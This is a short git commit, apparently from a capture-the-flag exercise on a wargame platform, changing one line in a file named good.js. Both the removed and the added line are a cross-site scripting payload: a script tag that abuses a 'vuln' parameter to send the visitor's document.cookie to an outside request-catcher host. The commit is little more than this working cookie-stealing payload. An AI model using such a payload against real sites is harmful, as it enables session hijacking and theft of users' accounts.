e722d92a96662b3be7dc59365911b9fc08d5853a
h9g29 <rlagmlrkd29@gmail.com>
2023-07-12 00:32:58 +0900

    Update good.js

--- good.js
+++ good.js
@@ -1,1 +1,1 @@
-<script src="http://host3.dreamhack.games:17424/vuln?param=document.location='https://gewkpls.request.dreamhack.games/?memo='%2bdocument.cookie;"></script>
+<script src="/vuln?param=document.location='https://gewkpls.request.dreamhack.games/?memo='%2bdocument.cookie;"></script>
